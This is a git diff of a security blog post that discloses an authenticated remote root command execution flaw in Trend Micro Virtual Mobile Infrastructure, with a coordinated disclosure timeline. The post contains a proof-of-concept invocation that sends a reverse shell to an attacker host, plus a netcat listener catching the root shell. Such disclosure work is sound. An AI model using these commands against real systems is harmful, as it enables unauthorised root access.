@@ -2,6 +2,9 @@
 layout: post
 title:  "Trend Micro Bug Hunting - Part III"
 date:   2016-10-08 07:00:00
+author: qkaiser
+excerpt: |
+    Trend Micro Virtual Mobile Infrastructure is affected by a remote command execution vulnerability. This vulnerability can be exploited by authenticated user on the web administration panel of VMI to gain remote command execution with root privileges.
 comments: true
 categories: pentesting trendmicro
 ---
@@ -99,18 +102,18 @@ def handle_certificate(self, pfx_file, password):
 
 I wrote the initial proof-of-concept using Python. You can get the code from [here]({{site.url}}assets/exploit_vmi.py).
 
-<pre>
+```
 python exploit.py --rhost vmi --rport 8443 --lhost attacker --lport 4444 --username admin --password admin
 [+] Login to https://vmi:8443/
 [+] Successfully logged in.
 [+] Uploading vmi.pfx to the server ...
 [+] File uploaded successfully (7283f4f2-ae5a-4683-957f-348418a10c67.pfx)
 [+] Sending payload ...
-</pre>
+```
 
 And here goes your root shell :)
 
-<pre>
+```
 nc -lvp 4444
 listening on [any] 4444 ...
 bash: no job control in this shell
@@ -119,7 +122,7 @@ root
 [root@localhost /]# pwd
 /
 [root@localhost /]# 
-</pre>
+```
 
 
 ### Conclusion
@@ -131,10 +134,10 @@ Once again, Trend Micro vulnerability team was great in handling this coordinate
 
 ### Disclosure Timeline
 
-* 2016-05-11: Advisory sent to Trend Micro 
-* 2016-05-11: Trend Micro acknowledge the issue
-* 2016-05-20: Trend Micro provides a planning for the fix
-* 2016-10-08: Trend Micro released a patch
+* **2016-05-11**: Advisory sent to Trend Micro 
+* **2016-05-11**: Trend Micro acknowledge the issue
+* **2016-05-20**: Trend Micro provides a planning for the fix
+* **2016-10-08**: Trend Micro released a patch
 
 ### CVE Identifier
 
